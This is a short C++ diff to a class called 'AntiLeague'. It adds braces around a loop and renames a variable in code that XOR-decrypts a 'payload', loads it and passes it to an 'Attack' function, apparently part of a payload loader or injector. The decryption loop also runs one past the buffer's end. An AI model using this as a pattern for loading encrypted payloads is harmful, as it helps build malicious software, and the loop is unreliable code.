@@ -12,7 +12,9 @@ void AntiLeague::cipher()
     }
 
     for (size_t i = 0; i <= payload.size(); i++)
+    {
         payload[i] ^= dec_key[i % dec_key.size()];
+    }
 }
 
 void AntiLeague::gen_dec_key()
@@ -87,8 +89,8 @@ DWORD WINAPI SafeShutdown(LPVOID event)
 
 void AntiLeague::Init()
 {
-    std::string payloadLocation = getPayload();
-    LoadPayload(payloadLocation);
+    std::string payloadPath = getPayload();
+    LoadPayload(payloadPath);
 
     HANDLE objects[2] = { NULL };
     objects[1] = CreateEvent(NULL, TRUE, FALSE, NULL);
@@ -114,5 +116,5 @@ void AntiLeague::Init()
         exit(1);
     }
 
-    Attack<InitProc>(InitProc(), "Init", &payloadLocation);
+    Attack<InitProc>(InitProc(), "Init", payloadPath);
 }
